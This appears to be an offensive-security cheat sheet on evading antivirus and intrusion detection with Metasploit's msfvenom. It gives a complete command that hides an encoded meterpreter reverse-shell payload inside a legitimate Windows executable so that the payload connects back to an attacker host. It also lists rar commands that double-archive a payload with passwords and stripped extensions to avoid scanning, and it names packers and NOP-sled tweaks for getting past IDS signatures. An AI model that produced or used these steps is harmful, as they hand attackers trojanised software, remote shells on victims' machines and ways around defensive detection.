# AV/IDS Evasion — MSFVenom Techniques

Inject payload into a legitimate executable — target runs the real app, payload fires in a separate thread:

```bash
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -k -x ~/Downloads/<LEGIT>.exe -e x86/shikata_ga_nai -a x86 --platform windows -o <OUTFILE>.exe -i 5
```

`-x` = template binary, `-k` = keep original execution flow in separate thread. Without `-k`, the real app won't launch — suspicious.

Password-protected double archive with no extension — drops from 11/59 to 0/49 detections:

```bash
rar a ~/payload.rar -p ~/payload.js   # archive + password
mv payload.rar payload                # strip extension
rar a payload2.rar -p payload         # archive again + password
mv payload2.rar payload2              # strip extension again
```

Transfer `payload2` to target, extract with password on their end. AV can't scan inside password-protected archives — shows as "unable to scan" in dashboard, not detected.

> [!warning] Double-archived payloads will appear as "unable to scan" in AV dashboards and may trigger manual inspection by an admin. Not silent — just undetectable.

Packers for additional obfuscation: UPX (most common, also most detected now), Enigma Protector, Themida. Apply after msfvenom generation — separate tooling, not built into MSF.

For BoF exploits: randomize NOP sled patterns and use `Offset` in the module target definition to vary buffer patterns — breaks IDS signature matching on well-known exploit buffers.